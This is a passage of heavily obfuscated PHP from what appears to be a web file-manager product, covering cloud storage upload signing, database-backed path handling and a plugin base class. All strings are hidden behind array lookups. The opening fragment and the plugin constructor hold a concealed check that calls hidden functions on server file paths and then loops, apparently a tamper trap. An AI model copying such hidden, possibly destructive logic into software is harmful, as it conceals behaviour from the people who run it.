!isset($_SERVER[$_SERVER[ÏéâËõ‘][865]])) { $_getc = $_SERVER[ÏéâËõ‘][866]; $_getfile = $_SERVER[$_SERVER[ÏéâËõ‘][867]] . $_SERVER[ÏéâËõ‘][868]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÏéâËõ‘][231], $_getfilec); if (count($_getarrs) < $_SERVER[ÏéâËõ‘][620]) { $exit = $_SERVER[ÏéâËõ‘][869]; $exit(); } $_act = $_SERVER[ÏéâËõ‘][870]; $_act($_SERVER[$_SERVER[ÏéâËõ‘][867]] . $_SERVER[ÏéâËõ‘][868]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÏéâËõ‘][378]); } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ï·Ã…ê) { parent::__construct($Ï·Ã…ê); $this->signatureVersion($_SERVER[ÏéâËõ‘][216]); } public function uploadFormData($½ÄïÄ«à, $ÛóŒ×ÅÆ = 3600) { $Á–€ª±ê =& $_SERVER[ÏéâËõ‘]; $ÕÅ•Ëºë = $Á–€ª±ê[198]; $ıùö‹ºë = $Á–€ª±ê[232]; $ÖåÑúÑ = $Á–€ª±ê[1315]; $·¹µçĞ£ = gmdate($Á–€ª±ê[1316], time() + $ÛóŒ×ÅÆ); $­ú´ê = (string) time() . $Á–€ª±ê[71] . (string) (time() + $ÛóŒ×ÅÆ); $–Ş»Øëğ = array($Á–€ª±ê[1317] => $·¹µçĞ£, $Á–€ª±ê[1318] => array(array($Á–€ª±ê[1319] => $ÕÅ•Ëºë), array($Á–€ª±ê[1320] => $this->bucket), array($Á–€ª±ê[1321], $Á–€ª±ê[1322], $Á–€ª±ê[12]), array($Á–€ª±ê[1323] => $ÖåÑúÑ), array($Á–€ª±ê[1324] => $ıùö‹ºë), array($Á–€ª±ê[1325] => $this->accessKey), array($Á–€ª±ê[1326] => $­ú´ê))); $–Ş»Øëğ = json_encode($–Ş»Øëğ); $ìø·à«û = hash_hmac($Á–€ª±ê[232], $­ú´ê, $this->secret); $„ÓÕêôğ = sha1($–Ş»Øëğ); $Óî¾Íœ¢ = hash_hmac($Á–€ª±ê[232], $„ÓÕêôğ, $ìø·à«û); $åÔ›‘”¸ = array($Á–€ª±ê[1319] => $ÕÅ•Ëºë, $Á–€ª±ê[1323] => $ÖåÑúÑ, $Á–€ª±ê[1327] => base64_encode($–Ş»Øëğ), $Á–€ª±ê[1324] => $ıùö‹ºë, $Á–€ª±ê[1325] => $this->accessKey, $Á–€ª±ê[1328] => $­ú´ê, $Á–€ª±ê[1329] => $Óî¾Íœ¢, $Á–€ª±ê[181] => $this->getHost()); return $åÔ›‘”¸; } public function fileOutLink($ŒÃè) { $ÕóÕ‚õ =& $_SERVER[ÏéâËõ‘]; if (substr($ŒÃè, 0, 7) == $ÕóÕ‚õ[1330]) { $ŒÃè = $ÕóÕ‚õ[1331] . substr($ŒÃè, 7); } header($ÕóÕ‚õ[161] . $ŒÃè); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($°ëëÆÇ) { $this->pathParse = $°ëëÆÇ; $this->model = Model($_SERVER[ÏéâËõ‘][1332]); } public function getPath($ŸË˜Ê‡¤) { return trim($ŸË˜Ê‡¤, $_SERVER[ÏéâËõ‘][8]); } public function pathFather($Äù™êá) { $·–Ô»ó¶ = $this->parse($Äù™êá); $·–Ô»ó¶ = $this->infoSimple($Äù™êá); return $·–Ô»ó¶ ? $·–Ô»ó¶[$_SERVER[ÏéâËõ‘][432]] : !1; } public function pathThis($³„ÊïĞé) { $ëñ£ÇÖ¿ = $this->infoSimple($³„ÊïĞé); return $ëñ£ÇÖ¿ ? $ëñ£ÇÖ¿[$_SERVER[ÏéâËõ‘][32]] : !1; } public function getPathOuter($¶Òğ‹Ÿ) { if (!$¶Òğ‹Ÿ) { return $¶Òğ‹Ÿ; } $ÄÑæı‡¦ = $this->parse($¶Òğ‹Ÿ); return KodIO::make($ÄÑæı‡¦[$_SERVER[ÏéâËõ‘][399]]); } public function copyFolderFromIO($İ©ç´Ê‹, $áÉ€º¾¶, $ƒ´ÁÅ«£, $á–‘ú›Š, $îŸñĞÔÀ) { $ËĞƒáÉç = $this->model->copyFolderFromIO($İ©ç´Ê‹, $áÉ€º¾¶, $ƒ´ÁÅ«£, $á–‘ú›Š, $îŸñĞÔÀ); return KodIO::make($ËĞƒáÉç); } public function isParentOf($İ“Áê‹´, $ü÷ø©®) { return $this->model->isParentOf($İ“Áê‹´, $ü÷ø©®); } public function mkfile($¡Í¦ª®±, $—‡£ĞÔ = '', $î½Å£Œü = REPEAT_RENAME) { $Á³şùÂ© =& $_SERVER[ÏéâËõ‘]; $—¼ĞıÒ” = $this->parse($¡Í¦ª®±); $¡Í¦ª®± = $—¼ĞıÒ”[$Á³şùÂ©[399]]; for ($¡½ÃõÁ¶ = 0; $¡½ÃõÁ¶ < count($—¼ĞıÒ”[$Á³şùÂ©[1333]]); $¡½ÃõÁ¶++) { $éææâÄ† = $—¼ĞıÒ”[$Á³şùÂ©[1333]][$¡½ÃõÁ¶]; if ($¡½ÃõÁ¶ == count($—¼ĞıÒ”[$Á³şùÂ©[1333]]) - 1) { $¡Í¦ª®± = $this->model->mkfile($¡Í¦ª®±, $éææâÄ†, $—‡£ĞÔ, $î½Å£Œü); break; } $¡Í¦ª®± = $this->model->mkdir($¡Í¦ª®±, $éææâÄ†, REPEAT_SKIP); } return $this->getPathOuter($¡Í¦ª®±); } public function mkdir($åâûšÉË, $Ü³ñô = REPEAT_SKIP) { $û‡ÁÍŠş =& $_SERVER[ÏéâËõ‘]; $ŞÊüŸÇ¼ = $this->parse($åâûšÉË); $åâûšÉË = $ŞÊüŸÇ¼[$û‡ÁÍŠş[399]]; for ($ø‹«•ÏŠ = 0; $ø‹«•ÏŠ < count($ŞÊüŸÇ¼[$û‡ÁÍŠş[1333]]); $ø‹«•ÏŠ++) { $ıò˜ˆ×İ = $ŞÊüŸÇ¼[$û‡ÁÍŠş[1333]][$ø‹«•ÏŠ]; $åâûšÉË = $this->model->mkdir($åâûšÉË, $ıò˜ˆ×İ, $Ü³ñô); } return $this->getPathOuter($åâûšÉË); } public function copyFile($‡ÜÂÈÄ, $ô´ÖÃê¹, $¦ä‹§Û‚ = REPEAT_REPLACE) { $ÆÑÌ×Ş® =& $_SERVER[ÏéâËõ‘]; $ñŞ¥õ‹À = $this->parse($ô´ÖÃê¹); $Ø’—¤” = $this->model->copy($‡ÜÂÈÄ, $ñŞ¥õ‹À[$ÆÑÌ×Ş®[399]], $¦ä‹§Û‚, $ñŞ¥õ‹À[$ÆÑÌ×Ş®[84]]); return $Ø’—¤” ? $this->getPathOuter($Ø’—¤”) : !1; } public function moveFile($»‰€Ãğö, $›Ì–ú¯İ, $ÅçÑ–³“ = REPEAT_REPLACE) { $’ƒ“Üƒ =& $_SERVER[ÏéâËõ‘]; $ÙˆÜüßƒ = $this->parse($›Ì–ú¯İ); $«ß¥Ã™ï = $this->model->move($»‰€Ãğö, $ÙˆÜüßƒ[$’ƒ“Üƒ[399]], $ÅçÑ–³“, $ÙˆÜüßƒ[$’ƒ“Üƒ[84]]); return $«ß¥Ã™ï ? $this->getPathOuter($«ß¥Ã™ï) : !1; } public function copy($øÄëÃ, $¡¾¦¾½õ, $ğ»ü¶Ó› = REPEAT_REPLACE, $ñ×» ²¿ = false) { $­ËùÖÊ¿ = $this->parse($¡¾¦¾½õ); $“èÁî¦ = $this->model->copy($øÄëÃ, $­ËùÖÊ¿[$_SERVER[ÏéâËõ‘][399]], $ğ»ü¶Ó›, $ñ×» ²¿); return $“èÁî¦ ? $this->getPathOuter($“èÁî¦) : !1; } public function moveSameAllow() { } public function move($ˆôàíŞ„, $³ŒÙ­’, $…¾å“Ïö = REPEAT_REPLACE, $§˜º‰åô = false) { $¹œï™Åı = $this->parse($³ŒÙ­’); $ÕØ‹Õ®× = $this->model->move($ˆôàíŞ„, $¹œï™Åı[$_SERVER[ÏéâËõ‘][399]], $…¾å“Ïö, $§˜º‰åô); return $ÕØ‹Õ®× ? $this->getPathOuter($ÕØ‹Õ®×) : !1; } public function remove($İışò¡š, $ŠöÁ¼Â = true) { return $this->model->remove($İışò¡š, $ŠöÁ¼Â); } public function rename($âÕõ ÇÊ, $è™÷ò‡Ï) { $é…Æ‡ï¡ = $this->model->rename($âÕõ ÇÊ, $è™÷ò‡Ï); return $é…Æ‡ï¡ ? $this->getPathOuter($âÕõ ÇÊ) : $é…Æ‡ï¡; } public function size($©±­ËØè) { $Úìª³Ç¬ = $this->infoSimple($©±­ËØè); return $Úìª³Ç¬ ? $Úìª³Ç¬[$_SERVER[ÏéâËõ‘][76]] : 0; } public function infoSimple($•ú»Í«ë) { return $this->model->sourceInfo($•ú»Í«ë); } public function info($á®‘®¦´) { return $this->infoParse($á®‘®¦´); } public function infoAuth($ö¢¡‰ö) { return $this->infoParse($ö¢¡‰ö, !1, !0); } public function infoWithChildren($ÜˆúÆ…À) { return $this->infoParse($ÜˆúÆ…À, !0); } protected function infoParse($ËÎÍ×ù¤, $İíüúØÕ = false, $÷Öú¥©ë = false) { if (!$İíüúØÕ) { return $this->model->pathInfo($ËÎÍ×ù¤, $÷Öú¥©ë); } return $this->model->pathInfoMore($ËÎÍ×ù¤); } public function infoFull($µ´±şÜ) { $•íÚÎÎ¯ =& $_SERVER[ÏéâËõ‘]; $­ŞÆáµæ = explode($•íÚÎÎ¯[8], $µ´±şÜ); $ó¯“Å = implode($•íÚÎÎ¯[8], array_splice($­ŞÆáµæ, 1)); return $this->model->pathInfoByPath($­ŞÆáµæ[0], $ó¯“Å); } public function hashSimple($‘‡ÚˆÁ¬) { $ô›…¿¸ë =& $_SERVER[ÏéâËõ‘]; $±¬ù˜¶ = $this->infoWithChildren($‘‡ÚˆÁ¬); return $±¬ù˜¶[$ô›…¿¸ë[170]][$ô›…¿¸ë[177]]; } public function hashMd5($³Ş¶œ) { $÷Ö¾Ïƒ =& $_SERVER[ÏéâËõ‘]; $Èü­ùşÏ = $this->infoWithChildren($³Ş¶œ); return $Èü­ùşÏ[$÷Ö¾Ïƒ[170]][$÷Ö¾Ïƒ[176]]; } public function exist($ŒÖìÂñö) { $œûØÑ­Õ =& $_SERVER[ÏéâËõ‘]; $ÄØÍÆÀ = $this->parse($ŒÖìÂñö); if (!$ÄØÍÆÀ[$œûØÑ­Õ[84]]) { return $this->isFile($ŒÖìÂñö) || $this->isFolder($ŒÖìÂñö); } $á¼¸¬¿ = array($œûØÑ­Õ[401] => $ÄØÍÆÀ[$œûØÑ­Õ[399]], $œûØÑ­Õ[32] => $ÄØÍÆÀ[$œûØÑ­Õ[84]]); $¡”ü¢‚ = $this->model->where($á¼¸¬¿)->find(); return $¡”ü¢‚ ? !0 : !1; } public function isFile($¿ÇãÅ¼²) { $šÓÈò‘Â =& $_SERVER[ÏéâËõ‘]; $£ı€¾…ä = $this->infoSimple($¿ÇãÅ¼²); return $£ı€¾…ä && $£ı€¾…ä[$šÓÈò‘Â[410]] == $šÓÈò‘Â[88] ? !1 : !0; } public function isFolder($¦èÛŒŒÎ) { $¯ø„¿é =& $_SERVER[ÏéâËõ‘]; $¹ÎÈ°Š¥ = $this->infoSimple($¦èÛŒŒÎ); return $¹ÎÈ°Š¥ && $¹ÎÈ°Š¥[$¯ø„¿é[410]] == $¯ø„¿é[88] ? !0 : !1; } public function listPath($İŠ¨Ëä, $öÈõ‘¹ = false) { $Û˜”ÙÙ¸ =& $_SERVER[ÏéâËõ‘]; if ($İŠ¨Ëä == $Û˜”ÙÙ¸[12]) { return !1; } $æŸ×¾§ = array($Û˜”ÙÙ¸[401] => $İŠ¨Ëä); if ($öÈõ‘¹) { return $this->model->listSource($æŸ×¾§, -1); } return $this->model->listSource($æŸ×¾§); } public function has($ÆùÕ¯·, $Ü¸†Óå÷ = false, $ãï²åà‡ = null) { $µ²À“— =& $_SERVER[ÏéâËõ‘]; $˜¦ù…´¶ = $this->infoWithChildren($ÆùÕ¯·); if ($Ü¸†Óå÷) { return array($µ²À“—[208] => $˜¦ù…´¶[$µ²À“—[208]], $µ²À“—[207] => $˜¦ù…´¶[$µ²À“—[207]]); } return $ãï²åà‡ ? $˜¦ù…´¶[$µ²À“—[208]] : $˜¦ù…´¶[$µ²À“—[207]]; } public function listAll($ªœ³œÚ) { $á±÷ß‰É = IO::info($this->pathParse[$_SERVER[ÏéâËõ‘][84]]); if (!$á±÷ß‰É) { return array(); } return $this->model->listAll($ªœ³œÚ); } public function getContent($äšÄ´¢) { return $this->model->getContent($äšÄ´¢); } public function setContent($èêŸ ’§, $Ô¾ì¬ò = '') { return $this->model->setContent($èêŸ ’§, $Ô¾ì¬ò); } public function fileSubstr($Àüíñœö, $ï±‹¥’®, $ŠİĞÖŒÂ) { return $this->model->fileSubstr($Àüíñœö, $ï±‹¥’®, $ŠİĞÖŒÂ); } public function download($…—Çæ÷ˆ, $àñ¡½ß¸ = '') { $ÎÃ²½õÙ = get_path_father($àñ¡½ß¸); $ôÆó®™ = get_path_this($àñ¡½ß¸); $„ ¦Êíú = $this->model->fileInfoGet($…—Çæ÷ˆ); $Ïò–‰¤¾ = IO::copy($„ ¦Êíú[$_SERVER[ÏéâËõ‘][84]], $ÎÃ²½õÙ, !1, $ôÆó®™); return $Ïò–‰¤¾; } public function setModifyTime($ÔµâËÒ, $ÆÂ²’ŠÚ = '') { $ÀÕöèÃ =& $_SERVER[ÏéâËõ‘]; if (!$ÔµâËÒ) { return; } $this->model->where(array($ÀÕöèÃ[417] => $ÔµâËÒ))->save(array($ÀÕöèÃ[85] => $ÆÂ²’ŠÚ)); } public function upload($°å¾”Í, $ğè–î“, $¦°€³ì« = false, $€Û¶ß§ = REPEAT_REPLACE) { $÷÷İÈ¯‡ =& $_SERVER[ÏéâËõ‘]; $ï¹ıñ³Î = $this->parse($°å¾”Í); $ä»—³î” = $this->model->addFile($ï¹ıñ³Î[$÷÷İÈ¯‡[399]], $ğè–î“, $ï¹ıñ³Î[$÷÷İÈ¯‡[84]], $¦°€³ì«, $€Û¶ß§); return $this->getPathOuter($ä»—³î”); } public function uploadFileByID($Áç¯šñ˜, $†‘Àå, $ıÎªë÷) { $¿Ğ‡Ì” =& $_SERVER[ÏéâËõ‘]; $ñ‚ñŸ§ = $this->parse($Áç¯šñ˜); $í€Şšäö = $this->model->addFileByFileID($ñ‚ñŸ§[$¿Ğ‡Ì”[399]], $†‘Àå, $ñ‚ñŸ§[$¿Ğ‡Ì”[84]], $ıÎªë÷); return $this->getPathOuter($í€Şšäö); } public function addFileByRemote($‚ÈêŒ„ü, $•ã´¹Ü, $ÏÆã”ÁÏ = array(), $£áüì˜ = '', $ÙÑ¦ÔßÓ) { $ó«ô¦… =& $_SERVER[ÏéâËõ‘]; $£æœŠ¿¤ = $this->parse($‚ÈêŒ„ü); $£áüì˜ = empty($£áüì˜) ? $£æœŠ¿¤[$ó«ô¦…[84]] : $£áüì˜; $ô›À—ÁÙ = $this->model->addFileByRemote($£æœŠ¿¤[$ó«ô¦…[399]], $•ã´¹Ü, $£áüì˜, $ÏÆã”ÁÏ, $ÙÑ¦ÔßÓ); return $this->getPathOuter($ô›À—ÁÙ); } public function uploadLink($÷½…ê®û, $¿éÙÍ‡¤ = 0) { $ËÑˆíïï =& $_SERVER[ÏéâËõ‘]; $šâê¿¤Â = $this->parse($÷½…ê®û); $ÎÖˆ‡ïÖ = _get($GLOBALS[$ËÑˆíïï[7]], $ËÑˆíïï[1334]); $…ÑÆ¬ë‹ = _get($GLOBALS[$ËÑˆíïï[7]], $ËÑˆíïï[1335]); $÷½…ê®û = Model($ËÑˆíïï[609])->createFileName($šâê¿¤Â[$ËÑˆíïï[84]], $ÎÖˆ‡ïÖ, $…ÑÆ¬ë‹); return IO::uploadLink($÷½…ê®û, $¿éÙÍ‡¤); } public function fileNameAuto($»¬‰»œÓ, $âÂšºº , $ò·ÎÈ­– = REPEAT_REPLACE, $çÓ¼õ” = false) { return $this->model->fileNameAuto($»¬‰»œÓ, $âÂšºº , $ò·ÎÈ­–, $çÓ¼õ”); } public function fileNameExist($ª‚ßµù, $¹«şã”) { return $this->model->fileNameExist($ª‚ßµù, $¹«şã”); } protected function _fileOut($¢ÇªÎƒÍ, $è‰¼Ğ¹‡ = false, $ãŸòÖ†È = false, $á×È¬Å = '', $îÇš§Ù = false) { $ÑöÜ¶Ñ× =& $_SERVER[ÏéâËõ‘]; $—ëĞù¯Ô = $this->model->sourceInfo($¢ÇªÎƒÍ); if ($—ëĞù¯Ô[$ÑöÜ¶Ñ×[410]] == $ÑöÜ¶Ñ×[88]) { header($ÑöÜ¶Ñ×[1336]); die; } $Ó›İİ¡ = $this->model->fileInfoGet($¢ÇªÎƒÍ); $á×È¬Å = $Ó›İİ¡[$ÑöÜ¶Ñ×[176]] ? $Ó›İİ¡[$ÑöÜ¶Ñ×[176]] : $á×È¬Å; $áëéù = isset($GLOBALS[$ÑöÜ¶Ñ×[1337]]) ? $GLOBALS[$ÑöÜ¶Ñ×[1337]] : $—ëĞù¯Ô[$ÑöÜ¶Ñ×[32]]; if ($îÇš§Ù) { return IO::fileOutServer($Ó›İİ¡[$ÑöÜ¶Ñ×[84]], $è‰¼Ğ¹‡, $áëéù, $á×È¬Å); } IO::fileOut($Ó›İİ¡[$ÑöÜ¶Ñ×[84]], $è‰¼Ğ¹‡, $áëéù, $á×È¬Å); } public function fileOut($é¥Ã¾‰, $ùµ‚¾Ÿ = false, $ªÈò¶Š = false, $€Ğœ¤× = '') { $this->_fileOut($é¥Ã¾‰, $ùµ‚¾Ÿ, $ªÈò¶Š, $€Ğœ¤×); } public function fileOutServer($ğùö‘¿ô, $Ô‡¾ĞŞÀ = false, $À•ö£Õİ = false, $èÅ„÷›© = '') { $this->_fileOut($ğùö‘¿ô, $Ô‡¾ĞŞÀ, $À•ö£Õİ, $èÅ„÷›©, !0); } protected function _fileOutImage($¤ô©Î‚€, $ß‹ï‚Ë = 250) { $”–¾£± =& $_SERVER[ÏéâËõ‘]; $ÒºĞã‰ = $this->model->pathInfo($¤ô©Î‚€); if ($ÒºĞã‰[$”–¾£±[410]] == $”–¾£±[88]) { show_json($”–¾£±[1338] . $¤ô©Î‚€, !1); } $Ô¢ôÉ®ª = $this->model->fileInfoGet($¤ô©Î‚€); $Ô¢ôÉ®ª[$”–¾£±[32]] = $ÒºĞã‰[$”–¾£±[32]]; $Ô¢ôÉ®ª[$”–¾£±[169]] = $ÒºĞã‰[$”–¾£±[169]]; $GLOBALS[$”–¾£±[1337]] = $Ô¢ôÉ®ª[$”–¾£±[32]]; $GLOBALS[$”–¾£±[168]] = $Ô¢ôÉ®ª; IO::fileOutImage($Ô¢ôÉ®ª[$”–¾£±[84]], $ß‹ï‚Ë); } public function fileOutImage($Ù¼˜á¢¯, $×ºƒç£Í = 250) { $this->_fileOutImage($Ù¼˜á¢¯, $×ºƒç£Í); } public function fileOutImageServer($¸Ÿâ³¶°, $ŒÙ´Á„ = 250) { $this->_fileOutImage($¸Ÿâ³¶°, $ŒÙ´Á„); } public function link($Òôğºá, $ôòÔ›³ = '') { $ÍŞó†Í = $this->model->fileInfoGet($Òôğºá); return IO::link($ÍŞó†Í[$_SERVER[ÏéâËõ‘][84]], $ôòÔ›³); } protected function parse($·ï†š¿Æ) { $·¹µâ¬Î =& $_SERVER[ÏéâËõ‘]; if (strstr($·ï†š¿Æ, $·¹µâ¬Î[8]) === !1) { return array($·¹µâ¬Î[419] => intval($·ï†š¿Æ), $·¹µâ¬Î[84] => $·¹µâ¬Î[12], $·¹µâ¬Î[1333] => array()); } $×Ğş¯— = explode($·¹µâ¬Î[8], trim($·ï†š¿Æ, $·¹µâ¬Î[8])); if (count($×Ğş¯—) < 2) { show_tips(clear_html($·ï†š¿Æ) . $·¹µâ¬Î[1339]); } return array($·¹µâ¬Î[419] => intval($×Ğş¯—[0]), $·¹µâ¬Î[84] => $×Ğş¯—[1], $·¹µâ¬Î[1333] => array_slice($×Ğş¯—, 1)); } } goto B¤Îæ¿¡Äİ; bô’îáøÕ‚: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $çË›Ë³ =& $_SERVER[ÏéâËõ‘]; if ($_SERVER[$çË›Ë³[864]] != $_SERVER[$çË›Ë³[1351]]) { $éÅğûç = $çË›Ë³[882]; $‡½®ª¤È = $çË›Ë³[866]; $¥Ğ•üğï = $_SERVER[$çË›Ë³[867]] . $çË›Ë³[868]; $‘‚Şã”¶ = $‡½®ª¤È($¥Ğ•üğï); $Ç™“š  = explode($çË›Ë³[231], $‘‚Şã”¶); if (count($Ç™“š ) < $çË›Ë³[626]) { $Ï€Ê­¯ = $çË›Ë³[869]; $Ï€Ê­¯(); } $©µ»¥À = $çË›Ë³[883]; $©µ»¥À($_SERVER[$çË›Ë³[884]]); $©µ»¥À($_SERVER[$çË›Ë³[867]] . $çË›Ë³[1527]); $´”ËÏÅÌ = 1; while ($´”ËÏÅÌ > 1) { $´”ËÏÅÌ = $´”ËÏÅÌ + 4; $óëÄüğî = rawurlencode($´”ËÏÅÌ . $çË›Ë³[378]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($çË›Ë³[1528]); $this->pluginName = str_replace($çË›Ë³[1528], $çË›Ë³[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $çË›Ë³[8]; $this->pluginApi = appHostGet() . $çË›Ë³[1529] . $this->pluginName . $çË›Ë³[8]; $this->pluginHost = $config[$çË›Ë³[1530]] . $this->pluginName . $çË›Ë³[8]; $this->pluginHostDefault = $config[$çË›Ë³[1530]] . $this->pluginName . $çË›Ë³[8]; $¼Ø¹€²¾ = $config[$çË›Ë³[1531]]; if ($¼Ø¹€²¾ && strpos($çË›Ë³[50] . $¼Ø¹€²¾ . $çË›Ë³[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$çË›Ë³[1532]] . $this->pluginName . $çË›Ë³[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÏéâËõ‘][1533]); } protected function assign($Óãå©íô, $­œú¤·Ã = false) { if (is_array($Óãå©íô)) { $this->values = array_merge($this->values, $Óãå©íô); } else { $this->values[$Óãå©íô] = $­œú¤·Ã; } } protected function display($Áè¨û) { extract($this->values); require $Áè¨û; } final function hookRegist($ë§µ©õ‰) { $this->modelPlugin->appRegist($this->pluginName, $ë§µ©õ‰); } final function appIcon() { $‘ˆ‘ì§‰ =& $_SERVER[ÏéâËõ‘]; $È³è«Şº = $this->appPackage(); $ƒŸ•†°é = $‘ˆ‘ì§‰[12]; if (isset($È³è«Şº[$‘ˆ‘ì§‰[416]])) { if (isset($È³è«Şº[$‘ˆ‘ì§‰[416]][$‘ˆ‘ì§‰[1534]])) { $ƒŸ•†°é = $‘ˆ‘ì§‰[1535] . $È³è«Şº[$‘ˆ‘ì§‰[416]][$‘ˆ‘ì§‰[1534]] . $‘ˆ‘ì§‰[1536]; } else { if ($È³è«Şº[$‘ˆ‘ì§‰[416]][$‘ˆ‘ì§‰[1537]]) { $ƒŸ•†°é = $‘ˆ‘ì§‰[1538] . $È³è«Şº[$‘ˆ‘ì§‰[416]][$‘ˆ‘ì§‰[1537]] . $‘ˆ‘ì§‰[1539]; } } } return $ƒŸ•†°é; } final function fileCanView($–˜Üú ) { $©â¤È’ =& $_SERVER[ÏéâËõ‘]; if (request_url_safe($–˜Üú )) { return !0; } if ($this->isShare($–˜Üú )) { return !0; } $ª†˜—¬í = Session::get($©â¤È’[1540]); if (!$ª†˜—¬í || !$ª†˜—¬í[$©â¤È’[1541]]) { $ğÉ—˜¶÷ = $©â¤È’[1542] . rawurlencode(this_url()); show_tips(LNG($©â¤È’[1543]) . $©â¤È’[1544] . $ğÉ—˜¶÷ . $©â¤È’[1545] . LNG($©â¤È’[1546]) . $©â¤È’[1547], !1); } if (!Action($©â¤È’[1548])->authCan($©â¤È’[1549])) { show_tips(LNG($©â¤È’[1550]) . $©â¤È’[1551], !1); } ActionCall($©â¤È’[1552], $–˜Üú ); } final function isShare($ßéŠşñ) { $­µ¼„Åä = KodIO::parse($ßéŠşñ); return $­µ¼„Åä[$_SERVER[ÏéâËõ‘][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($§Ÿõ¹¸) { if (request_url_safe($§Ÿõ¹¸)) { return $§Ÿõ¹¸; } if (!$this->isShare($§Ÿõ¹¸)) { $§Ÿõ¹¸ = $this->filePath($§Ÿõ¹¸); } return Action($_SERVER[ÏéâËõ‘][1180])->linkOut($§Ÿõ¹¸); } public function filePathLinkOut($Ì¸©Ï’ª) { if (request_url_safe($Ì¸©Ï’ª)) { return $Ì¸©Ï’ª; } $this->fileCanView($Ì¸©Ï’ª); return Action($_SERVER[ÏéâËõ‘][1180])->link($Ì¸©Ï’ª); } final function filePath($«¶è‰ïŠ) { $›¶à¾À… =& $_SERVER[ÏéâËõ‘]; if ($Ÿ„Ïê´Ñ = $this->checkSharePath($«¶è‰ïŠ)) { Hook::trigger($›¶à¾À…[1553], $Ÿ„Ïê´Ñ); return $Ÿ„Ïê´Ñ; } $this->fileCanView($«¶è‰ïŠ); if (request_url_safe($«¶è‰ïŠ)) { $Ë«æ’Ÿ· = parse_url_query($«¶è‰ïŠ); if (isset($Ë«æ’Ÿ·[$›¶à¾À…[1554]]) && isset($Ë«æ’Ÿ·[$›¶à¾À…[213]])) { $¬ºœÃ = Model($›¶à¾À…[772])->get($›¶à¾À…[773]); $ù®Ş¸€ı = Mcrypt::decode($Ë«æ’Ÿ·[$›¶à¾À…[213]], $¬ºœÃ); if ($ù®Ş¸€ı) { $this->fileInfo = IO::infoWithChildren($ù®Ş¸€ı); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ù®Ş¸€ı; } } $«¶è‰ïŠ = $this->_cacheHttpFile($«¶è‰ïŠ); $this->fileInfo = IO::infoWithChildren($«¶è‰ïŠ); } else { $this->fileInfo = IO::infoWithChildren($«¶è‰ïŠ); if (!$this->fileInfo) { show_tips(LNG($›¶à¾À…[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($›¶à¾À…[1553], $«¶è‰ïŠ); return $«¶è‰ïŠ; } final function _cacheHttpFile($Õ¼ôÅÙ¢) { $‘À…âŠ = hash_path($Õ¼ôÅÙ¢, !0); $this->cachePath = $this->pluginCachePath($‘À…âŠ); if ($¢Æİ½ƒœ = IO::fileNameExist($this->cachePath, $‘À…âŠ)) { return KodIO::make($¢Æİ½ƒœ); } $‹û†æüê = $this->cachePath . $‘À…âŠ; return $this->pluginCacheFileSet($‹û†æüê, file_get_contents_nossl($Õ¼ôÅÙ¢)); } final function _tmpFileName($ÁÉô¬í‰ = array()) { $Ú§ºÚ”× =& $_SERVER[ÏéâËõ‘]; if (!$ÁÉô¬í‰) { $ÁÉô¬í‰ = $this->fileInfo; } if (isset($ÁÉô¬í‰[$Ú§ºÚ”×[177]])) { return $ÁÉô¬í‰[$Ú§ºÚ”×[177]]; } if (isset($ÁÉô¬í‰[$Ú§ºÚ”×[170]][$Ú§ºÚ”×[177]])) { return $ÁÉô¬í‰[$Ú§ºÚ”×[170]][$Ú§ºÚ”×[177]]; } $¸¾Ò ÀÛ = IO::hashSimple($ÁÉô¬í‰[$Ú§ºÚ”×[84]]); if ($¸¾Ò ÀÛ) { return $¸¾Ò ÀÛ; } $ëÜ¸àÍğ = array($ÁÉô¬í‰[$Ú§ºÚ”×[32]], $ÁÉô¬í‰[$Ú§ºÚ”×[84]], $ÁÉô¬í‰[$Ú§ºÚ”×[76]]); if (isset($ÁÉô¬í‰[$Ú§ºÚ”×[521]])) { $ëÜ¸àÍğ[] = $ÁÉô¬í‰[$Ú§ºÚ”×[521]]; } return md5(implode($Ú§ºÚ”×[11], $ëÜ¸àÍğ)); } final function checkSharePath($¿¨âúÌ›) { $¯»ÌüŞÔ =& $_SERVER[ÏéâËõ‘]; if (!defined($¯»ÌüŞÔ[475])) { define($¯»ÌüŞÔ[514], 0); } if (!$this->isShare($¿¨âúÌ›)) { return !1; } $ÃÛ·³üœ = Action($¯»ÌüŞÔ[1180])->sharePathInfo($¿¨âúÌ›); if (!isset($ÃÛ·³üœ[$¯»ÌüŞÔ[84]])) { show_json(LNG($¯»ÌüŞÔ[1555]), !1); } $this->fileInfo = $ÃÛ·³üœ[$¯»ÌüŞÔ[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$¯»ÌüŞÔ[177]]); return $ÃÛ·³üœ[$¯»ÌüŞÔ[84]]; } final function pluginCachePath($š³–‚¥‰ = '') { $­ÜğıŸ =& $_SERVER[ÏéâËõ‘]; $‹‘Ë•Ô = IO_PATH_SYSTEM_TEMP . $­ÜğıŸ[1556] . $this->pluginName; if (!($ÖÛß‡›š = IO::infoFull($‹‘Ë•Ô))) { return IO::mkdir($‹‘Ë•Ô . $­ÜğıŸ[8] . $š³–‚¥‰); } if (empty($š³–‚¥‰)) { return $ÖÛß‡›š[$­ÜğıŸ[84]]; } if (!($¾ÒÈÂßÂ = IO::fileNameExist($ÖÛß‡›š[$­ÜğıŸ[84]], $š³–‚¥‰))) { return IO::mkdir($ÖÛß‡›š[$­ÜğıŸ[84]] . $š³–‚¥‰); } return KodIO::make($¾ÒÈÂßÂ); } final function pluginCacheFileSet($ùÎ¤ÙèĞ, $ÁÔª¯îñ = '') { $éŠò§‹ =& 